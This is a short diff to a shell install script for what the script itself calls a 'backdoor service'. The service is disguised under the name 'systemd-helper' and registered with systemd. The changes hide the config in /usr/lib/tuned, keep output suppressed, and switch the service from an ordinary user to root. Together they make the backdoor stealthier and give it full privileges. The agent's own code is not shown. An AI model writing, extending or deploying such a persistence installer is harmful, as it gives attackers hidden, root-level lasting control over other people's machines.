@@ -5,6 +5,7 @@ SERVICE_NAME="systemd-helper"
 AGENT_NAME="systemd-helper.py"
 CURRENT_PATH=$(pwd)
 INSTALL_PATH="/usr/local/bin"
+CONFIG_PATH="/usr/lib/tuned"
 SERVICE_PATH="/etc/systemd/system"
 
 echo "[+] Installing backdoor service..."
@@ -16,7 +17,7 @@ sudo mv $CURRENT_PATH/$AGENT_NAME $INSTALL_PATH/$SERVICE_NAME.py
 # === Move config ===
 if [ -f $CURRENT_PATH/config.json ]; then
     echo "[+] Moving config.json..."
-    sudo mv $CURRENT_PATH/config.json $INSTALL_PATH/config.json
+    sudo mv $CURRENT_PATH/config.json $CONFIG_PATH/config.json
 fi
 
 # === Set permissions ===
@@ -39,7 +40,7 @@ Restart=on-failure
 RestartSec=5
 StandardOutput=null
 StandardError=null
-User=user
+User=root
 
 [Install]
 WantedBy=multi-user.target
